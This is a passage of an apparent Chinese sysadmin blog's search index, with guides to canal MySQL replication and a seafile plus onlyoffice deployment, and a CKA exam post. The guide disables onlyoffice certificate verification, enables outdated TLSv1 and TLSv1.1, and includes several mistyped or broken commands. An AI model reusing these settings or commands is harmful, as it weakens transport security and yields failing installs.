10.8.2.12 # canal instance Name or mq topic name groups: - groupId: g1 outerAdapters: - name: logger - name: rdb key: mysqlbak1 properties: jdbc.driverClassName: com.mysql.jdbc.Driver jdbc.url: jdbc:mysql://10.8.2.17:3306/xxl_job_bak?useUnicode=true jdbc.username: sync_17 jdbc.password: xxxxxx - name: rdb key: mysqlbak2 properties: jdbc.driverClassName: com.mysql.jdbc.Driver jdbc.url: jdbc:mysql://10.8.2.17:3306/?useUnicode=true jdbc.username: sync_17 jdbc.password: xxxxxx 2、编辑表同步配置文件mysqlbak2.yml\n注意，里面其实只有一个配置起作用 database，而且目的库中必须事先建立好xxl_job的库表结构，库名也必须和源中库名完全一致，举例来说，从 xxl_job 只能同步到 xxl_job，不能从xxl_job同步到xxl_jobbak中。\n#dataSourceKey: defaultDS # cannal的instance或者MQ的topic destination: 10.8.2.12 groupId: g1 outerAdapterKey: mysqlbak2 concurrent: true dbMapping: mirrorDb: true database: xxl_job 然后我们看 10.8.2.17 上面 xxl_job 库里的数据就会增量开始跟源库同步了。\n","permalink":"https://rendoumi.com/posts/20230115-canal_mysql/","summary":"\u003cp\u003e普遍的大数据抽数的方式都是从散落在各个地方的 MySQL 数据库中开账号，然后把数据同步过来。\u003c/p\u003e\n\u003cp\u003e这不，大数据的同事提出了一个需求，想把某个库中的某个表的数据单独同步到大数据的统一库中的某个表中。\u003c/p\u003e\n\u003cp\u003e研究了一个星期，canal 的配置对运维来说非常的不友好，除非用它那个 admin 的 dashboard，但是运维通常是 cli 界面，谁没事装个 dashboard 来配置呢，太 low 了。\u003c/p\u003e\n\u003cp\u003e用的是 canal 1.1.5 的版本，不能升级，升级后 java 不对了。还没有到用 1.1.6 的时候！\u003c/p\u003e\n\u003cp\u003e背景：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e源数据库：10.8.2.12 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e库：xxl_job\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e表：demotable666\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e目的数据库：10.8.2.17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e库：xxl_job_bak\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e表：demotable666\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e而且不用任何的Zookeeper、Kafka、RabbitMQ的中间件，越简洁越好。\u003c/p\u003e\n\u003ch5 id=\"一安装canal\"\u003e一、安装canal\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.deployer-1.1.5.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.adapter-1.1.5.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#都装到 /app 目录下\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /app/deploy\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /app/adapter\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /app/deploy\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf canal.deployer-1.1.5.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /app/adapter\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf canal.adapter-1.1.5.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"二mysql源准备\"\u003e二、MySQL源准备\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# /etc/my.cnf 加入以下几项并重启\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003emysqld\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-bin\u003cspan class=\"o\"\u003e=\u003c/span\u003emysql-bin \u003cspan class=\"c1\"\u003e# Start log bin.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ebinlog_format\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eROW \u003cspan class=\"c1\"\u003e# Log format.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver-id\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Server id,different from slave.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e授权binlog同步：\u003c/p\u003e","title":"运维方案之canal数据库同步"},{"content":"之前公司一直用的是 seafile 来保存文档，非常好用，也出过一次大事，一个离职的员工清空电脑，然后直接把sefaile文件夹也同步清空了，好在有版本，最后找了回来。\n换到新公司，财务也提了共享云盘的要求，还要求能多人同时在线编辑。\n那就试着搭建 seafile + onlyoffice 了，同时要求提高安全性，在网上搜索了一圈，没几个对的，尤其是对https这一块，花了2天时间搭建，记录一下整个过程：\n一、下载seafile： 没有选定高版本的，最新版本的变化太多，缺省全部都安装到 /app 目录下\nwget https://download.seadrive.org/seafile-server_7.0.0_x86-64.tar.gz tar zxvf seafile-server_7.0.0_x86-64.tar.gz mkdir /app mv seafile-server-7.0.0 /app 二、设定CentOS7 依然活在 CentOS 7.10 的时代，再往上升级，要升到 rokey linux 了\n提醒：seafile 的安装根据版本不同，yum 装的东西也不尽然相同的，要去官方文档看\nyum install python python-setuptools MySQL-python python-urllib3 python-ldap -y 三、安装MySQL数据库 这个就仁者见仁、智者见智了，我现在的方式都是二进制装，选用的是 mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz 安装的，\ntar zxvf mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz mv mysql-5.6.51-linux-glibc2.12-x86_64 /app yum -y install autoconf libaio* cat\u0026lt;\u0026lt;EOF\u0026gt;/etc/my.cnf [mysql] # 设置mysql客户端默认字符集 default-character-set=utf8 socket=/tmp/mysql.sock [mysqld] skip-name-resolve #设置3306端口 port = 3306 socket=/tmp/mysql.sock # 设置mysql的安装目录 basedir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/ # 设置mysql数据库的数据的存放目录 datadir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/data # 允许最大连接数 max_connections=200 # 服务端使用的字符集默认为8比特编码的latin1字符集 character-set-server=utf8 # 创建新表时将使用的默认存储引擎 default-storage-engine=INNODB #lower_case_table_name=1 max_allowed_packet=16M sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES EOF groupadd -g mysql useradd -g mysql mysql # 初始化DB cd /app/mysql-5.6.51-linux-glibc2.12-x86_64/ /app/mysql-5.6.51-linux-glibc2.12-x86_64/scripts/mysql_install_db --user=mysql #建立 /etc/init.d/mysql 的软链接 mysql -\u0026gt; /app/mysql-5.6.51/support-files/mysql.server #启动 /etc/init.d/mysql start # 安全设置DB cd /app/mysql-5.6.51-linux-glibc2.12-x86_64/ /app/mysql-5.6.51-linux-glibc2.12-x86_64/bin/mysql_secure_installation 四、准备onlyoffice 这里有大坑啊，其实onlyoffice的版本万万不能用最新的，因为JWT的Token认证\n所以必须用低版本的，然后呢由于它其实是一组程序，调用的时候又是只用web，所以封在docker里最好\ncd /etc/yum.repos.d/ wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo yum -y install docker-ce systemctl enable --now docker.service #准备好证书目录 mkdir /app/onlyoffice/certs #用lego申请好的let\u0026#39;s encrypt免费证书或者正式证书 #只能叫这两个名字，其他不行！！！！ onlyoffice.crt onlyoffice.key #生成dh cd /app/onlyoffice/certs openssl dhparam -out dhparam.pem 2048 #跑容器 docker run -i -t -d -p 8443:443 --restart=always -v /app/onlyoffice:/var/www/onlyoffice/Data onlyoffice/documentserver:6.4.2.6 我们这里选用 onlyoffice 6.4.2.6 版本的，同时打开8443:443的端口，意味着我们准备要跑https，然后onlyoffice的证书是如上的设定方法，网上一堆胡说八道直接放开443但是无证书的，有的还要进去docker改，都不对。\n五、安装seafile 这个很简单，但也很坑\ncd /app/seafile-server-7.0.0/ ./setup-seafile-mysql.sh #回答问题，第一个答： seafile #第二个答域名，因为我们是真的用域名 seafile.rendoumi.com #剩下选回车 这里遇到个大坑，由于我们mysql安装选择了secure的模式，所以这里会安不过去\n报seafile用户无权限，没办法，用navicat，进去看用户，安装脚本给我们生成了一个用户，但是是localhost权限的，我们改成127.0.0.1，然后保存\n重新安装，就可以安装成功了。\n然后就是先初始化一下：\ncd /app/seafile-server-latest/ ./seafile.sh start #设置管理员和密码 ./seahub.sh start 然后都停掉 ./seahub.sh stop ./seafile.sh stop 准备安全配置\ncd /app/conf/ #vi ccnet.conf # NAME和SERVIcE_URL就是上面安装时我们回答的2个问题 NAME = seafile SERVICE_URL = https://seafile.rendoumi.com #vi seafile.conf # 增加host监听地址为127.0.0.1，稍后我们设置nginx转发，更加安全 [fileserver] host = 127.0.0.1 port = 8082 #vi seahub_settings.py # 增加以下各项，有onlyoffice的，有8082的 FILE_SERVER_ROOT = \u0026#39;https://seafile.rendoumi.com/seafhttp\u0026#39; MAX_NUMBER_OF_FILES_FOR_FILEUPLOAD = 5000 ENABLE_ONLYOFFICE = True VERIFY_ONLYOFFICE_CERTIFICATE = False ONLYOFFICE_APIJS_URL = \u0026#39;https://seafile.rendoumi.com:8443/web-apps/apps/api/documents/api.js\u0026#39; ONLYOFFICE_FILE_EXTENSION = (\u0026#39;doc\u0026#39;, \u0026#39;docx\u0026#39;, \u0026#39;ppt\u0026#39;, \u0026#39;pptx\u0026#39;, \u0026#39;xls\u0026#39;, \u0026#39;xlsx\u0026#39;, \u0026#39;odt\u0026#39;, \u0026#39;fodt\u0026#39;, \u0026#39;odp\u0026#39;, \u0026#39;fodp\u0026#39;, \u0026#39;ods\u0026#39;, \u0026#39;fods\u0026#39;) ONLYOFFICE_EDIT_FILE_EXTENSION = (\u0026#39;docx\u0026#39;, \u0026#39;pptx\u0026#39;, \u0026#39;xlsx\u0026#39;,\u0026#39;doc\u0026#39;,\u0026#39;xls\u0026#39;,\u0026#39;ppt\u0026#39;) 准备systemctl的启动文件\ncat \u0026lt;\u0026lt;EOF\u0026gt;/etc/systemd/system/seafile.service [Unit] Description=Seafile Server After=network.target mariadb.service [Service] Type=oneshot ExecStart=/app/seafile-server-latest/seafile.sh start ExecStart=/app/seafile-server-latest/seahub.sh start ExecStop=/app/seafile-server-latest/seafile.sh stop ExecStop=/app/seafile-server-latest/seahub.sh stop RemainAfterExit=yes User=root Group=root [Install] WantedBy=multi-user.target EOF 然后我们现在可以正式启动seafile了\nsystemctl daemon-reload systemctl start seafile 六、安装nginx yum -y install epel-release yum -y install nginx # 生成dh cd /etc/nginx/ openssl dhparam -out dhparam.pem 2048 vi /etc/nginx/nginx.conf #增加以下这个大段 server { listen 80; server_name seafile.rendoumi.com; rewrite ^ https://$http_host$request_uri? permanent; } server { listen 443 ssl; server_name seafile.rendoumi.com; ssl_certificate /etc/nginx/seafile.crt; #cacert.pem 文件路径 ssl_certificate_key /etc/nginx/seafile.key; #privkey.pem 文件路径 ssl_dhparam /etc/nginx/dhparam.pem; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers \u0026#39;ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-CAMELLIA256-SHA:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-SEED-SHA:DHE-RSA-CAMELLIA128-SHA:HIGH:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS\u0026#39;; ssl_prefer_server_ciphers on; proxy_set_header X-Forwarded-For $remote_addr; add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains\u0026#34;; server_tokens off; location / { proxy_pass http://127.0.0.1:8000; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Host $server_name; proxy_set_header X-Forwarded-Proto https; access_log /var/log/nginx/seahub.access.log; error_log /var/log/nginx/seahub.error.log; proxy_read_timeout 1200s; client_max_body_size 0; } location /seafhttp { rewrite ^/seafhttp(.*)$ $1 break; proxy_pass http://127.0.0.1:8082; client_max_body_size 0; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_connect_timeout 36000s; proxy_read_timeout 36000s; proxy_send_timeout 36000s; send_timeout 36000s; } location /media { root /app/seafile-server-latest/seahub; #seahub的路径 } } 以上我们可以看到，seafile实际监听了127.0.0.1:8000和127.0.0.1:8082端口，被代理到了nginx，这样监听在本地，nginx再套上https证书，就很安全了，启动\nsystemctl enbale --now nginx 七、设置seafile 然后我们登录 https://seafile.rendoumi.com, 修改一下配置\n确保设置正确：\nSERVICE_URL设置的是 `https://seafile.rendoumi.com` FILE_SERVER_ROOT 设置的是 `https://seafile.rendoumi.com/seafhttp` 然后就可以了，seafile就可以在线编辑了。\n八、附加onlyoffice修改 我们还需要增加一点特色，给onlyoffice做一些修改：\n1、自动保存\n进入onlyoffice容器\ndocker exec -it 容器 /bin/bash echo \u0026#34;Asia/Shanghai\u0026#34; \u0026gt; /etc/timezone ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime date -R nano /etc/onlyoffice/documentserver/local.json { \u0026#34;services\u0026#34;: { \u0026#34;CoAuthoring\u0026#34;: { // 在 CoAuthoring 中 增加 autoAssembly 属性配置 \u0026#34;autoAssembly\u0026#34;: { \u0026#34;enable\u0026#34;: true, \u0026#34;interval\u0026#34;: \u0026#34;5m\u0026#34; }, //注意这个，逗号 } } } 2、安装字体\n字体文件放进一个zip的压缩包，其中一个目录名为office，里面是文件\n然后把文件传进Linux机器中，解压\nexport LANG=zh_CN.UTF-8 unzip -x office.zip cd office ls 查看一下，务必像下面一样，是中文的\n然后在office目录那一级，把字体文件拷贝进容器\ndocker cp office 472bf8a36f14:/usr/share/fonts/truetype/custom 进入容器\ndocker exec -it 472bf8a36f14 /bin/bash # 更新字体 mkfontscale mkfontdir fc-cache -fv documentserver-generate-allfonts.sh #退出容器，重启 docker restart 472bf8a36f14 然后onlyoffice就会5分钟自动保存一下，然后多了一堆好看的中文字体：\n","permalink":"https://rendoumi.com/posts/20230115-seafile_onlyoffice/","summary":"\u003cp\u003e之前公司一直用的是 seafile 来保存文档，非常好用，也出过一次大事，一个离职的员工清空电脑，然后直接把sefaile文件夹也同步清空了，好在有版本，最后找了回来。\u003c/p\u003e\n\u003cp\u003e换到新公司，财务也提了共享云盘的要求，还要求能多人同时在线编辑。\u003c/p\u003e\n\u003cp\u003e那就试着搭建 seafile + onlyoffice 了，同时要求提高安全性，在网上搜索了一圈，没几个对的，尤其是对https这一块，花了2天时间搭建，记录一下整个过程：\u003c/p\u003e\n\u003ch5 id=\"一下载seafile\"\u003e一、下载seafile：\u003c/h5\u003e\n\u003cp\u003e没有选定高版本的，最新版本的变化太多，缺省全部都安装到 /app 目录下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://download.seadrive.org/seafile-server_7.0.0_x86-64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf seafile-server_7.0.0_x86-64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv seafile-server-7.0.0 /app\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"二设定centos7\"\u003e二、设定CentOS7\u003c/h5\u003e\n\u003cp\u003e依然活在 CentOS 7.10 的时代，再往上升级，要升到 rokey linux 了\u003c/p\u003e\n\u003cp\u003e提醒：seafile 的安装根据版本不同，yum 装的东西也不尽然相同的，要去官方文档看\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install python python-setuptools MySQL-python python-urllib3 python-ldap -y\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"三安装mysql数据库\"\u003e三、安装MySQL数据库\u003c/h5\u003e\n\u003cp\u003e这个就仁者见仁、智者见智了，我现在的方式都是二进制装，选用的是 mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz 安装的，\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv mysql-5.6.51-linux-glibc2.12-x86_64 /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install autoconf libaio*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\u0026gt;/etc/my.cnf\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[mysql]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# 设置mysql客户端默认字符集\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003edefault-character-set=utf8\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esocket=/tmp/mysql.sock\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[mysqld]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eskip-name-resolve\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#设置3306端口\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eport = 3306\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esocket=/tmp/mysql.sock\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# 设置mysql的安装目录\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ebasedir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# 设置mysql数据库的数据的存放目录\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003edatadir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/data\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# 允许最大连接数\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emax_connections=200\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# 服务端使用的字符集默认为8比特编码的latin1字符集\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003echaracter-set-server=utf8\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# 创建新表时将使用的默认存储引擎\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003edefault-storage-engine=INNODB\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#lower_case_table_name=1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emax_allowed_packet=16M\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egroupadd -g mysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euseradd -g mysql mysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 初始化DB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /app/mysql-5.6.51-linux-glibc2.12-x86_64/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/app/mysql-5.6.51-linux-glibc2.12-x86_64/scripts/mysql_install_db --user\u003cspan class=\"o\"\u003e=\u003c/span\u003emysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#建立 /etc/init.d/mysql 的软链接\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysql -\u0026gt; /app/mysql-5.6.51/support-files/mysql.server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#启动\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/etc/init.d/mysql start\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 安全设置DB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /app/mysql-5.6.51-linux-glibc2.12-x86_64/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/app/mysql-5.6.51-linux-glibc2.12-x86_64/bin/mysql_secure_installation\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"四准备onlyoffice\"\u003e四、准备onlyoffice\u003c/h5\u003e\n\u003cp\u003e这里有大坑啊，其实onlyoffice的版本万万不能用最新的，因为JWT的Token认证\u003c/p\u003e","title":"seafile配搭onlyoffice的安装"},{"content":"刚通过了CKA的考试，拿到了证书。\n说老实话，想考这个必须翻墙啊，在考试的时候正好是新冠的第三天，烧得正厉害。\n然后考试的过程真是一波三折，PSI 足足重新认证了三次，浪费40分钟。\n最后都感觉要完蛋了，只剩下不到10分钟检查，结果还不错，考了90分。\n有第一次考的可以联系我，我给你说一些必须注意的事项。\n然后 CKA 有一个模拟考试，36小时时间，实际考试的环境跟模拟的完全不一样啊。\n但是模拟如果你能过，那考试你一定能过，模拟的难度不低，相当高。\n这就把模拟的题给放出来，供大家参考，非常有参考价值。\n大家可以学到很多东西。\n文件下载：cka.html 单html文件\n","permalink":"https://rendoumi.com/posts/20230112-cka_exam/","summary":"\u003cp\u003e刚通过了CKA的考试，拿到了证书。\u003c/p\u003e\n\u003cp\u003e说老实话，想考这个必须翻墙啊，在考试的时候正好是新冠的第三天，烧得正厉害。\u003c/p\u003e\n\u003cp\u003e然后考试的过程真是一波三折，PSI 